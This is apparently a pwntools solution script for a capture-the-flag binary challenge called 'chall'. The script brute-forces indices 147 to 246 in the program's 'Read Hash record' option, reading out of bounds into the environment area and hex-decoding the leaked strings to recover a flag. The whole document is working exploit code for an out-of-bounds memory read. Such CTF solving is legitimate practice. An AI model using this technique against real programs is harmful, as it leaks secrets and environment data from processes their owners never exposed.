from pwn import *
import binascii

context.binary = elf = ELF("./chall")
context.log_level = "CRITICAL"

# 147 is the base of envp
for i in range(147, 247):
    io = elf.process(env={"flag": "flag{fakeflag}"})

    try:
        io.sendlineafter(b"2 - Read Hash record", b"2")
        io.sendlineafter(b"Idx", str(i).encode())
        output = io.recvline()[:-1]
        if not (b"Entry does not exist." in output):
            hex_ouput = output.split(b" : ")[1]
            print(binascii.unhexlify(hex_ouput))
    except:
        pass
    finally:
        io.close()
